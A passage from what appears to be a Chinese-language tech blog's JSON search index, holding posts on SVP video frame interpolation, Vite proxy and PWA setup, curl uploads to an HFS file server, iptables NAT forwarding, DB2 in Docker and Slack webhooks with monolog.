rel=\"noopener\">https://www.bilibili.com/video/av8576153?from=search&amp;seid=12894762763554126401</a><br>裡面測試失敗</li>\n</ol>\n<p>聽說比較高階顯卡會遇到這個問題</p>\n<p><strong>目前解決方法，把NGU設定調低</strong><br>尤其搭 SVP 的時候叫的更明顯<br>不是越高就越好</p>\n<p>後來我不斷測試調設定<br>發現 MSI Afterburner 看片的時候<br>GPU clock 飆到 紅色三角形就會嘯叫<br>GPU clock 會隨著調整 NGU 飆高</p>\n<img src=\"/blog/2019/12/29/使用-SVP-補幀-4K-螢幕小記/forum1.png\" title=\"msi\">\n<img src=\"/blog/2019/12/29/使用-SVP-補幀-4K-螢幕小記/forum2.png\" title=\"list\">\n<p>相關問題我有在<a href=\"http://bbs.vcb-s.com/thread-5115-1-1.html\" target=\"_blank\" rel=\"noopener\">各位有沒有遇到顯示卡嘯叫(高頻音)情況? - 灌水聊天 - VCB-Studio分享論壇 - Powered by Discuz!</a>發問</p>\n<h2 id=\"結論\"><a href=\"#結論\" class=\"headerlink\" title=\"結論\"></a>結論</h2><p>網路上有各式各樣設定，我覺得不用比哪個設定比較好，自己看得舒服真的比較重用<br>SVP 是非常順暢，但是偽影、字幕扭曲、快轉lag(聽說有比以前好)真的是很大缺點<br>FM 不是每一個影片都會做補真<br>但是 FM 快轉不會頓、偽影字幕扭曲這個優勢真的很大<br>雙顯示卡方法補真也是不錯選擇<br>但每一個方法各有優缺點<br>大家可以選擇對自己有利的方法<br>自己看的舒服比較重要</p>\n<h2 id=\"補幀細節參數設定\"><a href=\"#補幀細節參數設定\" class=\"headerlink\" title=\"補幀細節參數設定\"></a>補幀細節參數設定</h2><p><strong>2020-12-03</strong></p>\n<p>推薦使用<a href=\"https://blackmickeysvp.blogspot.com/2017/07/svpbeta.html\" target=\"_blank\" rel=\"noopener\">黑米奇SVP: 測試筆記：SVP最新測試版參數beta script（2020-11-18 更新）</a><br>裡面的<code>Kevingwn版</code>參數設定，複製到SVP4 PRO/Script 裡面去<br>覆蓋前可以先備份<br><code>Mickey版</code>建議電腦比較好的人使用<br>我 CPU Intel 4790k 跑得非常 lag ，<del>但流暢度應該會不錯吧?!</del> 我也不確定<br>不過跑的人可能要注意，他裡面會放一些外部 plugin<br>移除<code>Mickey版</code>換回<code>Kevingwn版</code>有遇到奇怪的問題<br>播放器會跑出 not found …….<br>應該是plugin 造成的，後來一直復原檔案重開某一次就好了…</p>\n<p>這邊紀錄一下，我會拿哪些片段看偽影影片 1080P<br>方便以後比偽影有沒有比較好<br>以下用<code>Kevingwn版</code>有明顯改善</p>\n<ol>\n<li><p>Princess Principal 05 14:06~18:58<br>15:15~15:23 火車鐵軌視野移動<br>16:19~16:21 臉部特寫<br>17:54~17:58 飛刀瞬間 這邊一定會偽影</p>\n</li>\n<li><p>紫羅蘭永恆花園 01 01:24~02:23<br>01:19~01:36 寫字、掉筆<br>後面紙飛出，也能觀查偽影</p>\n</li>\n<li><p>末日要做什麼? 01<br>05:22~05:35 這邊一定會偽影</p>\n</li>\n<li><p>天氣之子 01:30:12~01:36:56 (可以從重點重看XD)</p>\n</li>\n</ol>\n<p>01:35:00~01:35:05 進入雲層偽影<br>01:36:26~01:36:56 在旋轉那邊鞋子會有變形</p>\n<ol start=\"5\">\n<li>鋼鍊 OP 裡面文字會抖</li>\n</ol>\n","categories":["影音"],"tags":["補幀","SVP"]},{"title":"使用 Vite 初體驗","url":"/blog/2021/06/02/%E4%BD%BF%E7%94%A8-Vite-%E5%88%9D%E9%AB%94%E9%A9%97/","content":"<p>我很久沒寫Vue<br>都忘記差不多<br>最近想寫一個小東西<br>有聽過一場Vite研討會<br>覺得很方便，就來使用看看</p>\n<a id=\"more\"></a>\n<p><a href=\"https://paper.dropbox.com/doc/vite2-Make-Web-Dev-Fast-Again-Again.-9DcJOLb0spaYNbCbF6Zqd\" target=\"_blank\" rel=\"noopener\">vite2: Make Web Dev Fast Again &amp; Again. – Dropbox Paper</a></p>\n<p>裡面dev proxy，還滿方便的<br>但不能做CROS 方法<br>這邊想成<code>npm run dev</code> 時候，進去  /api/ 時候會倒 proxy server<br>測試時候很方便</p>\n<p>除了上面教學</p>\n<p>這邊還滿多 Vite 文章<br><a href=\"https://www.kuxiaoxin.com/tags/vite\" target=\"_blank\" rel=\"noopener\">标签：vite - Fidel Yiu | 前端技术博客</a></p>\n<p>Vite PWA<br><a href=\"https://www.kuxiaoxin.com/archives/75\" target=\"_blank\" rel=\"noopener\">第六十章-Vite插件-vite-plugin-pwa - Fidel Yiu | 前端技术博客</a></p>\n<p>但我後來源參照這篇</p>\n<p>官方設定好像不是這樣(不知道是不是舊版的文)<br>設定非常簡單</p>\n<figure class=\"highlight javascript\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> &#123; defineConfig &#125; <span class=\"keyword\">from</span> <span class=\"string\">'vite'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> vue <span class=\"keyword\">from</span> <span class=\"string\">'@vitejs/plugin-vue'</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> &#123; VitePWA &#125; <span class=\"keyword\">from</span> <span class=\"string\">'vite-plugin-pwa'</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// https://vitejs.dev/config/</span></span><br><span class=\"line\"><span class=\"keyword\">export</span> <span class=\"keyword\">default</span> defineConfig(&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  server: &#123;</span><br><span class=\"line\">    proxy: &#123;</span><br><span class=\"line\">      <span class=\"string\">'/api'</span>: &#123;</span><br><span class=\"line\">        target: <span class=\"string\">'http://localhost:8080/api'</span>,</span><br><span class=\"line\">        <span class=\"comment\">// changeOrigin: true,</span></span><br><span class=\"line\">        rewrite: <span class=\"function\"><span class=\"params\">path</span> =&gt;</span> path.replace(<span class=\"regexp\">/^\\/api/</span>, <span class=\"string\">''</span>)</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  plugins: [vue(),VitePWA(&#123;</span><br><span class=\"line\">    registerType: <span class=\"string\">'autoUpdate'</span>,  </span><br><span class=\"line\">    manifest: &#123;</span><br><span class=\"line\">      <span class=\"string\">\"name\"</span>: <span class=\"string\">\"XXXX\"</span>,</span><br><span class=\"line\">      <span class=\"string\">\"short_name\"</span>: <span class=\"string\">\"XXXX\"</span>,</span><br><span class=\"line\">      <span class=\"string\">\"start_url\"</span>: <span class=\"string\">\".\"</span>,</span><br><span class=\"line\">      <span class=\"string\">\"display\"</span>: <span class=\"string\">\"standalone\"</span>,</span><br><span class=\"line\">      <span class=\"string\">\"background_color\"</span>: <span class=\"string\">\"#fff\"</span>,</span><br><span class=\"line\">      <span class=\"string\">\"description\"</span>: <span class=\"string\">\"XXXX\"</span>,</span><br><span class=\"line\">      <span class=\"string\">\"icons\"</span>: [ &#123;</span><br><span class=\"line\">        <span class=\"string\">\"src\"</span>: <span class=\"string\">\"images/android-launchericon-48-48.png\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"sizes\"</span>: <span class=\"string\">\"48x48\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"type\"</span>: <span class=\"string\">\"image/png\"</span></span><br><span class=\"line\">      &#125;,&#123;</span><br><span class=\"line\">        <span class=\"string\">\"src\"</span>: <span class=\"string\">\"images/android-launchericon-72-72.png\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"sizes\"</span>: <span class=\"string\">\"72x72\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"type\"</span>: <span class=\"string\">\"image/png\"</span></span><br><span class=\"line\">      &#125;,&#123;</span><br><span class=\"line\">        <span class=\"string\">\"src\"</span>: <span class=\"string\">\"images/android-launchericon-144-144.png\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"sizes\"</span>: <span class=\"string\">\"144x144\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"type\"</span>: <span class=\"string\">\"image/png\"</span></span><br><span class=\"line\">      &#125;,&#123;</span><br><span class=\"line\">        <span class=\"string\">\"src\"</span>: <span class=\"string\">\"images/android-launchericon-192-192.png\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"sizes\"</span>: <span class=\"string\">\"192x192\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"type\"</span>: <span class=\"string\">\"image/png\"</span></span><br><span class=\"line\">      &#125;,&#123;</span><br><span class=\"line\">        <span class=\"string\">\"src\"</span>: <span class=\"string\">\"images/android-launchericon-512-512.png\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"sizes\"</span>: <span class=\"string\">\"512x512\"</span>,</span><br><span class=\"line\">        <span class=\"string\">\"type\"</span>: <span class=\"string\">\"image/png\"</span></span><br><span class=\"line\">      &#125;]</span><br><span class=\"line\">    &#125;,</span><br><span class=\"line\">    workbox: &#123;</span><br><span class=\"line\">      <span class=\"comment\">// workbox options for generateSW</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;)]</span><br><span class=\"line\">&#125;)</span><br></pre></td></tr></table></figure>","categories":["Vue"],"tags":["cors","vue","vite"]},{"title":"使用 command line 上傳檔案到 HFS","url":"/blog/2020/07/15/%E4%BD%BF%E7%94%A8-command-line-%E4%B8%8A%E5%82%B3%E6%AA%94%E6%A1%88%E5%88%B0-HFS/","content":"<p>最近要使用 Linux 下載憑證下來看<br>主機沒有裝 vsftpd 想說用 WinSCP 下載<br>但又發現沒有使用 root 權限無法進去資料夾<br>有想到有沒有 sudo 方法<br><a href=\"https://developer.aliyun.com/article/373923\" target=\"_blank\" rel=\"noopener\">Winscp使用sudo user登录-阿里云开发者社区</a><br>但不太想改這個設定…<br>最後突然想到有 Windows HFS 來接檔案<br>原本有想到 nc 接檔案，但好像很麻煩 哈哈<br><a href=\"https://www.arthurtoday.com/2012/01/ubuntu.html\" target=\"_blank\" rel=\"noopener\">Ubuntu 用 nc 指令互傳檔案</a><br>Windows 也沒 nc 指令</p>\n<a id=\"more\"></a>\n<p>非常簡單</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl -F fileupload1=@filename -F press=<span class=\"string\">\"Upload files\"</span> http://IP:Port/Dir/</span><br></pre></td></tr></table></figure>\n<p>記得資料夾要設定上傳 anyone<br>原理可以看<a href=\"https://slinbody.pixnet.net/blog/post/66022614\" target=\"_blank\" rel=\"noopener\">curl upload file @ 495884965 :: 痞客邦 ::</a></p>\n<blockquote>\n<p>#curl -v -F ‘file=@/tmp/444.jpg’ -b cookies.txt -c cookies.txt  <a href=\"https://your.web.site/upload\" target=\"_blank\" rel=\"noopener\">https://your.web.site/upload</a><br>其中，file要看該網頁的變數名稱決定</p>\n<p>例如：<br><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt;     <span class=\"tag\">&lt;<span class=\"name\">form</span> <span class=\"attr\">method</span>=<span class=\"string\">post</span> <span class=\"attr\">enctype</span>=<span class=\"string\">multipart/form-data</span>&gt;</span></span><br><span class=\"line\">&gt;       <span class=\"tag\">&lt;<span class=\"name\">p</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">file</span> <span class=\"attr\">name</span>=<span class=\"string\">file_name</span>&gt;</span></span><br><span class=\"line\">&gt;          <span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">submit</span> <span class=\"attr\">value</span>=<span class=\"string\">Upload</span>&gt;</span></span><br><span class=\"line\">&gt;     <span class=\"tag\">&lt;/<span class=\"name\">form</span>&gt;</span></span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<blockquote>\n<p>用curl時，就要變成file_name</p>\n</blockquote>\n<p>我還以為 @ 是多餘的</p>\n<p>最後成功</p>\n<p>最後有爬到<a href=\"http://rejetto.com/forum/index.php?pretty;board=hfs-~-http-file-server;topic=upload-with-filename-inside-url.msg1042258#msg1042258\" target=\"_blank\" rel=\"noopener\">upload with filename inside URL</a></p>\n<blockquote>\n<p>1) The curl command shown below without an ending “/“ after the <code>&lt;HFSfolder&gt;</code> works better in that it return the “301” code to the console when everything works properly (with an ending “/“ you get the echo of the HFS html upload page, the upload still works fine, but having the return code available to any error checking in a script is probably be better).  You probably know better than I why there is this slight difference between having the “/“ at the end and not having it.<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">curl  -F fileupload1=@MyFile.iso  -F press=<span class=\"string\">\"Upload files\"</span>  http://&lt;HFSipaddress&gt;/&lt;HFSfolder&gt;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n<blockquote>\n<p>2) I’ve tested curl ability to take input from stdin via a command, for example, like this:<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">cat testfile.gz  |  curl -F fileupload1=@-;filename=atestfile.gz -F press=<span class=\"string\">\"Upload files\"</span> http://&lt;HFSipaddress&gt;/&lt;HFSfolder&gt;</span><br></pre></td></tr></table></figure></p>\n</blockquote>\n","categories":["Linux"],"tags":["linux","hfs","curl"]},{"title":"使用 Wiremock 搭建 mockapi","url":"/blog/2020/11/24/%E4%BD%BF%E7%94%A8-Wiremock-%E6%90%AD%E5%BB%BA-mockapi/","content":"<p>之前有使用<a href=\"https://malagege.github.io/blog/2018/09/25/vscode%E5%A5%97%E4%BB%B6Rest-Client%E6%90%AD%E9%85%8DJSON-Server%E7%B0%A1%E5%96%AE%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98/\">vscode套件Rest Client搭配JSON-Server簡單使用小記 | 程式狂想筆記</a><br>但我覺得設定還不是很好用</p>\n<a id=\"more\"></a>\n<p>有找到 Wiremock<br>他 router 跟 sample data json 是分開的<br>設定上我覺得非常快速<br>不會設定錯</p>\n<blockquote>\n<p>git clone <a href=\"https://github.com/timmyBeef/mock-api.git\" target=\"_blank\" rel=\"noopener\">https://github.com/timmyBeef/mock-api.git</a></p>\n</blockquote>\n<p><a href=\"https://timmybeef.github.io/2019/09/20/wiremock/\" target=\"_blank\" rel=\"noopener\">使用 Wiremock mock api (假造 api) - TimmyBeef’s Blog</a> <a href=\"/blog/2020/11/24/使用-Wiremock-搭建-mockapi/web.png\" title=\"備份圖\">備份圖</a><br>裡面介紹很清楚<br>看作者裡面內容吧</p>\n","categories":["實用軟體"],"tags":["mockapi"]},{"title":"使用 iptables 實做 NAT 轉發封包","url":"/blog/2020/06/14/%E4%BD%BF%E7%94%A8-iptables-%E5%AF%A6%E5%81%9A-NAT-%E8%BD%89%E7%99%BC%E5%B0%81%E5%8C%85/","content":"<p>之前有跟別的公司合作取得三組 VPN 帳號密碼<br>但是我們團隊有 10 人<br>這三組怎麼做<br>雖然最近專案已經結束了<br>我有看到使用 Linux iptables 設定 NAT 轉發封包<br>今天就簡單嘗試</p>\n<a id=\"more\"></a>\n<h2 id=\"網路知識\"><a href=\"#網路知識\" class=\"headerlink\" title=\"網路知識\"></a>網路知識</h2><p><del>臨時抱佛腳時間</del></p>\n<h3 id=\"預設閘道\"><a href=\"#預設閘道\" class=\"headerlink\" title=\"預設閘道\"></a>預設閘道</h3><p>一般我的常設定 IP ，都會設定預設閘道<br>預設閘道通常都是設定中華電信小烏龜<br><del>一般可能不會去了解原因</del><br>這邊簡呆說明一下原因<br>之前幾篇有講到 CIDR<br>現在正常設定 IP 都會設定 Mask (網路遮罩)<br>只要超過遮罩時候，<strong>就會轉發到 預設閘道</strong><br>就會根據路由器做轉發到別的網域</p>\n<h3 id=\"NAT\"><a href=\"#NAT\" class=\"headerlink\" title=\"NAT\"></a>NAT</h3><p>wifi 連線的時候，會自動分配 IP (DHCP)<br>通常拿到的 IP 都是私有網域 IP<br>所以外面的網路通常 PING 不到</p>\n<h4 id=\"SNAT\"><a href=\"#SNAT\" class=\"headerlink\" title=\"SNAT\"></a>SNAT</h4><p><a href=\"http://linux.vbird.org/linux_server/0250simple_firewall.php#fig9.1-2\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – Linux 防火牆與 NAT 伺服器</a></p>\n<h4 id=\"DNAT\"><a href=\"#DNAT\" class=\"headerlink\" title=\"DNAT\"></a>DNAT</h4><p>一般常用的就是 Virtual Server，這就是一種 DNAT</p>\n<p><a href=\"http://linux.vbird.org/linux_server/0250simple_firewall.php#fig9.1-3\" target=\"_blank\" rel=\"noopener\">鳥哥的 Linux 私房菜 – Linux 防火牆與 NAT 伺服器</a></p>\n<h3 id=\"其他小記\"><a href=\"#其他小記\" class=\"headerlink\" title=\"其他小記\"></a>其他小記</h3><h4 id=\"Windows-10-和-Linux-如何轉發-IP\"><a href=\"#Windows-10-和-Linux-如何轉發-IP\" class=\"headerlink\" title=\"Windows 10 和 Linux 如何轉發 IP\"></a>Windows 10 和 Linux 如何轉發 IP</h4><p>每一台電腦都可以擔任轉發動作，但一開始我在<strong>預設閘道</strong>怎麼沒有效果<br>其實都需要設定</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS: 小補轉發跨網域會發生什麼事情</span><br><span class=\"line\">一般轉發不會改變來源 IP</span><br><span class=\"line\">跨網域後封包不會送回來</span><br></pre></td></tr></table></figure>\n<p>Win 10</p>\n<blockquote>\n<p>2、windows xp、Vista、windows7：</p>\n<p>打开注册表：regedit.exe</p>\n<p>打到：HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters</p>\n<p>增加：<br>Value Name: IpEnableRouterData Type: REG_DWORD</p>\n<p>Value: 1</p>\n<p>重启机器。<br>————————————————<br>版权声明：本文为CSDN博主「kl222」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>原文链接：<a href=\"https://blog.csdn.net/kl222/java/article/details/12878755\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/kl222/java/article/details/12878755</a></p>\n</blockquote>\n<p><a href=\"https://blog.csdn.net/kl222/article/details/12878755\" target=\"_blank\" rel=\"noopener\">打开windows的路由功能_康林工作室-CSDN博客</a></p>\n<p>linux</p>\n<p>一般在設定 iptables forward<br>但前置作業記得要先做這個動作</p>\n<blockquote>\n<p>查詢IP forward功能是否開啟<br>cat /proc/sys/net/ipv4/ip_forward<br>0代表沒有啟動<br>1代表已啟動</p>\n<p>暫時啟動IP forward功能<br>echo 1 &gt; /proc/sys/net/ipv4/ip_forward<br>重新開機就會失效</p>\n<p>永久開啟IP forward功能<br>vi /etc/sysctl.conf<br>加上這句<br>net.ipv4.ip_forward = 1<br>立刻讓設定生效<br>sysctl -p</p>\n</blockquote>\n<p><a href=\"https://danshuei.pixnet.net/blog/post/119262469-ip-forward\" target=\"_blank\" rel=\"noopener\">IP forward @ 小志的隨便記 :: 痞客邦 ::</a></p>\n<h2 id=\"如何-SNAT-轉發\"><a href=\"#如何-SNAT-轉發\" class=\"headerlink\" title=\"如何 SNAT 轉發\"></a>如何 SNAT 轉發</h2><p>不錯文章</p>\n<ul>\n<li><a href=\"https://www.cnblogs.com/sparkdev/p/9262825.html\" target=\"_blank\" rel=\"noopener\">Linux ip forward - sparkdev - 博客园</a></li>\n<li><a href=\"https://blog.miniasp.com/post/2010/06/08/Setup-NAT-environment-using-iptables-under-Linux\" target=\"_blank\" rel=\"noopener\">如何在 Linux 下利用 iptables 快速設定 NAT 環境 | The Will Will Web</a></li>\n</ul>\n<p>我這邊簡單實作讓另外一台沒網路用預設閘道連線<br>參考保哥範例如下</p>\n<p>NAT(PC):<br>wlp3s0: 192.168.1.117 (可以連線出去網段)<br>wlp3s0: 192.168.100.2 （環境要做 NAT 網段)</p>\n<p>PC(一般):<br>IP: 192.168.100.50(起設定在 192.168.100.0/24 範圍內)<br>Mask: 255.255.255.0<br>Gateway: 192.168.100.2</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 1. Define variables</span></span><br><span class=\"line\"><span class=\"comment\">## WAN_IF 是設定轉發出去 IP &amp; 從哪邊轉發出去</span></span><br><span class=\"line\"><span class=\"comment\">## 我這邊是 Linux 在 1 個 Wifi Interface 做 2 個 IP</span></span><br><span class=\"line\"><span class=\"comment\">## 這邊我主要是對另一台做連線動作</span></span><br><span class=\"line\"><span class=\"comment\">## 保哥範例是 PPPOE ，這邊可以設定 VPN Interface</span></span><br><span class=\"line\"></span><br><span class=\"line\">WAN_IF=<span class=\"string\">\"wlp3s0\"</span></span><br><span class=\"line\">WAN_IP=<span class=\"string\">\"192.168.1.117\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">## 進來 IP 做轉發，通常是設定區域網路 IP 範圍</span></span><br><span class=\"line\"><span class=\"comment\">## 這邊我也是用同一個 Interface</span></span><br><span class=\"line\"></span><br><span class=\"line\">LAN_IF=<span class=\"string\">\"wlp3s0\"</span></span><br><span class=\"line\">LAN_IP=<span class=\"string\">\"192.168.100.0/24\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 2. modprobe</span></span><br><span class=\"line\"></span><br><span class=\"line\">/sbin/modprobe ip_tables</span><br><span class=\"line\">/sbin/modprobe iptable_filter</span><br><span class=\"line\">/sbin/modprobe ip_conntrack</span><br><span class=\"line\">/sbin/modprobe ip_conntrack_ftp</span><br><span class=\"line\">/sbin/modprobe ip_conntrack_irc</span><br><span class=\"line\">/sbin/modprobe ipt_state</span><br><span class=\"line\">/sbin/modprobe ipt_limit</span><br><span class=\"line\">/sbin/modprobe ipt_REJECT</span><br><span class=\"line\">/sbin/modprobe ipt_REDIRECT</span><br><span class=\"line\">/sbin/modprobe ipt_LOG</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 3. Flush &amp; Reset iptables settings</span></span><br><span class=\"line\"></span><br><span class=\"line\">/sbin/iptables -F</span><br><span class=\"line\">/sbin/iptables -X</span><br><span class=\"line\">/sbin/iptables -Z</span><br><span class=\"line\">/sbin/iptables -F -t nat</span><br><span class=\"line\">/sbin/iptables -X -t nat</span><br><span class=\"line\">/sbin/iptables -Z -t nat</span><br><span class=\"line\">/sbin/iptables -P INPUT DROP</span><br><span class=\"line\">/sbin/iptables -P OUTPUT ACCEPT</span><br><span class=\"line\">/sbin/iptables -P FORWARD ACCEPT</span><br><span class=\"line\">/sbin/iptables -t nat -P PREROUTING ACCEPT</span><br><span class=\"line\">/sbin/iptables -t nat -P POSTROUTING ACCEPT</span><br><span class=\"line\">/sbin/iptables -t nat -P OUTPUT ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 4. Accept connection from LOCALHOST ( loopback )</span></span><br><span class=\"line\"></span><br><span class=\"line\">/sbin/iptables -A INPUT -i lo -j ACCEPT</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 5. Acception connection from some ports ( Firewall rules )</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># /sbin/iptables -A INPUT -m state --state NEW -p tcp --dport 80 -j ACCEPT</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 6. Source NAT settings</span></span><br><span class=\"line\"></span><br><span class=\"line\">/sbin/iptables -A INPUT -i <span class=\"variable\">$LAN_IF</span> -j ACCEPT</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"1\"</span> &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class=\"line\">/sbin/iptables -A POSTROUTING -t nat -o <span class=\"variable\">$WAN_IF</span> -s <span class=\"variable\">$LAN_IP</span> -j SNAT --to <span class=\"variable\">$WAN_IP</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 8. Accept connection from ESTABLISHED and RELATED connection</span></span><br><span class=\"line\"></span><br><span class=\"line\">/sbin/iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</span><br></pre></td></tr></table></figure>\n<p>DNAT 就是這一段了<br>我有空研究再補<br>通常對方沒設定 SNAT 的時候<br>只能設定 DNAT(或安全因素)</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">/sbin/iptables -t nat -A PREROUTING -p tcp -i ppp0 --dport 80 -j DNAT --to 192.168.100.104:80</span><br></pre></td></tr></table></figure>\n<p>最後設定這個不如使用 VPN 實做會不會比較方便?<br>有時間研究</p>\n<h2 id=\"番外-iptables-可以設定對網域做調整\"><a href=\"#番外-iptables-可以設定對網域做調整\" class=\"headerlink\" title=\"番外 iptables 可以設定對網域做調整\"></a>番外 iptables 可以設定對網域做調整</h2><p><a href=\"https://defragged.org/2020/03/14/blocking-http-requests-via-iptables-for-a-specific-domain/\" target=\"_blank\" rel=\"noopener\">Blocking HTTP requests via Iptables for a specific domain – Defragged</a></p>\n","categories":["Linux"],"tags":["linux","nat","iptables"]},{"title":"使用CSS自訂checkbox方法","url":"/blog/2018/04/26/%E4%BD%BF%E7%94%A8CSS%E8%87%AA%E8%A8%82checkbox%E6%96%B9%E6%B3%95/","content":"<p>平常在用<code>checkout</code>都用在分支<br>不過今天查看<code>checkout</code>也可以用在還原<br>其實這是用checkbox css hack方法<br>之前有一篇寫過了…但沒想到之前那篇沒寫完整<br>還有之前有看過改CSS取消原本樣式<br>改天來記錄一下吧!!<br><a href=\"http://jsbin.com/hapineqoca/edit?css,output\" target=\"_blank\" rel=\"noopener\">[CSS] checkbox hack 模擬在網頁開視窗</a></p>\n<a id=\"more\"></a>\n<p>簡單來講，就是利用checkbox CSS hack<br><code>:checked</code>跟<code>+</code>或<code>~</code>的條件(Selector)<br>來實做這個問題<br>實做後比較好懂</p>\n<h1 id=\"自訂checkbox方法\"><a href=\"#自訂checkbox方法\" class=\"headerlink\" title=\"自訂checkbox方法\"></a>自訂checkbox方法</h1><p><a href=\"https://jsbin.com/bebetiqalu/edit?html,css,output\" target=\"_blank\" rel=\"noopener\">https://jsbin.com/bebetiqalu/edit?html,css,output</a></p>\n","categories":["網頁特效"],"tags":["css","css hack","checkbox"]},{"title":"使用docker架設db2環境","url":"/blog/2018/11/08/%E4%BD%BF%E7%94%A8docker%E6%9E%B6%E8%A8%ADdb2%E7%92%B0%E5%A2%83/","content":"<p>最近要實驗boolean在db2<br>會有什麼結果<br>所以找找有沒有docker簡單架設方法<br>可以在docker api玩</p>\n<a id=\"more\"></a>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">docker run -it -p 50000:50000 -e DB2INST1_PASSWORD=db2inst1-pwd -e LICENSE=accept ibmcom/db2express-c:latest bash</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">$ su - db2inst1</span><br><span class=\"line\">$ db2start</span><br><span class=\"line\">$ db2sampl</span><br><span class=\"line\">$ db2 connect to sample</span><br><span class=\"line\">$ db2 &quot;SELECT * FROM STAFF&quot;</span><br></pre></td></tr></table></figure>\n<p>有畫面就是正常</p>\n<p>因為要實驗一個東西<br>這篇紀錄到這邊</p>\n<p>參考來源：<br><a href=\"https://dongrenwen.github.io/2018/05/07/docker-install-db2/#%E4%BB%8E%E7%BD%91%E7%BB%9C%E8%8E%B7%E5%8F%96db2express-c%E9%95%9C%E5%83%8F\" target=\"_blank\" rel=\"noopener\">通过Docker安装db2express-c — 董仁文的博客</a>（沒有加上db2start）<br><a href=\"https://hub.docker.com/r/ibmcom/db2express-c/\" target=\"_blank\" rel=\"noopener\">ibmcom/db2express-c - Docker Hub</a><br><a href=\"https://www.ibm.com/support/knowledgecenter/zh-tw/SSEPGG_10.5.0/com.ibm.db2.luw.qb.server.doc/doc/t0008501.html\" target=\"_blank\" rel=\"noopener\">IBM Knowledge Center - 驗證分割的資料庫伺服器安裝（Linux 及 UNIX）</a></p>\n","categories":["Docker"],"tags":["db2","docker"]},{"title":"使用monolog和slack 做webhook小記","url":"/blog/2019/03/19/%E4%BD%BF%E7%94%A8monolog%E5%92%8Cslack-%E5%81%9Awebhook%E5%B0%8F%E8%A8%98/","content":"<p>最近在看 monolog 程式如何使用<br>不過這篇不會詳細記錄 monolog<br>這篇主要是記錄 slack webhook<br>怕之後會忘記要怎麼串接 webhook</p>\n<a id=\"more\"></a>\n<p>雖然我平常沒有什麼在玩 slack<br>同事有開一個 slack，但沒有什麼人再用<br>monolog 內建有 slack</p>\n<p>slack 我有 google 到一篇說可以用三種方式連線<br><a href=\"https://medium.com/@taihua/slack-api-%E5%98%97%E8%A9%A6%E7%99%BC%E9%80%81%E8%A8%8A%E6%81%AF%E5%88%B0team%E5%85%A7-6d88070cacd5\" target=\"_blank\" rel=\"noopener\">嘗試利用 slack api 發送訊息到 teams 內 – taihua – Medium</a><br>今天簡單使用 webhook 方式連</p>\n<p>首先，從這邊登入<a href=\"https://api.slack.com/apps?new_app=1\" target=\"_blank\" rel=\"noopener\">Slack API: Applications | Slack</a><br>可以<code>create app</code></p>\n<img src=\"/blog/2019/03/19/使用monolog和slack-做webhook小記/1.png\" title=\"create app\">\n<img src=\"/blog/2019/03/19/使用monolog和slack-做webhook小記/2.png\" title=\"add webhook\">\n<p>點選 on，下面<code>add webhook ...</code>按鈕點下去<br>會跳出授權頁面，這時候你只要選擇頻道或使用者<br>會得到一串網址</p>\n<p>接下來 monolog 使用 slack webhook<br>簡單使用如下<br>就只要把 webhook 網址帶進去就可以用了(太簡單了)</p>\n<figure class=\"highlight php\"><figcaption><span>main.php</span></figcaption><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span 